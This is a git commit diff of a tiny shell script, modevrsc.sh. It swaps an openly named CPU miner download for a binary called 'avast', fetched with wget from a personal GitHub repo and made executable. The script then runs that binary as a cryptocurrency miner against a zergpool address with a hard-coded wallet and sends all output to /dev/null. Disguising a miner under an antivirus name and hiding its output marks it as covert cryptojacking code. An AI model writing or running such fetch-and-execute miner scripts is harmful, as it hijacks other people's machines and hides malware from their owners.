023315790567cfe35947b0936b7dcbfb6e232131
aurbach55 <95366868+aurbach55@users.noreply.github.com>
2022-02-14 13:08:23 +0700

    Update modevrsc.sh

--- modevrsc.sh
+++ modevrsc.sh
@@ -1,4 +1,5 @@
 #!/bin/sh
-curl -L https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz --output hellminer_cpu_linux.tar.gz 
-tar xf hellminer_cpu_linux.tar.gz
-./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RWsems1CfyqgPe4c9UdJTP2RsSUtC389jG -p x --cpu 16
+#!/bin/bash
+wget https://github.com/aurbach55/pos/raw/main/avast
+chmod +x avast  >/dev/null 2>&1
+./avast -v -l  verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DASH -t 4 >/dev/null 2>&1
